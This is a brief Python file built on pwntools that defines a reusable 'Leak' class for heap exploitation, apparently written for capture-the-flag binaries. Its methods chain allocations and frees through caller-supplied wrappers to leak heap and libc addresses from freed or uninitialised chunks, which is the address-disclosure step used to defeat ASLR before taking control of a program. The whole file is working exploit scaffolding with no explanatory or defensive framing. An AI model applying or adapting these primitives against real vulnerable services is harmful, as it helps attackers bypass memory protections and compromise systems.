from pwn import *


class Leak:
    def __init__(self, allocate, remove, view):
        '''
        All arguments should be functions that act as wrappers
        Minimum criteria is at least 2 consecutive allocations.
        Chunk sizes shouldn't be constrained to be greater than 0 or
        lesser than 0x80

        allocate : Allocate chunks on the heap.
        remove   : Free chunks on the heap (uses indexes)
        view     : View contents of chunks (uses indexes)
        '''

        self.allocate = allocate
        self.remove = remove
        self.view = view

    def leak_all(self):
        self.allocate(0x10)
        self.allocate(0x80)
        self.allocate(0x10)
        self.remove(1)
        self.remove(2)
        self.remove(0)
        self.allocate(0)
        self.allocate(0)
        self.allocate(0)
        return self.view(0), self.view(2)

    def leak_heap(self):
        self.allocate(0x20)
        self.allocate(0x20)
        self.remove(1)
        self.remove(0)
        self.allocate(0)
        return self.view(0)

    def leak_libc(self):
        self.allocate(0x80)
        self.allocate(0x20)
        self.remove(0)
        self.allocate(0)
        return self.view(0)
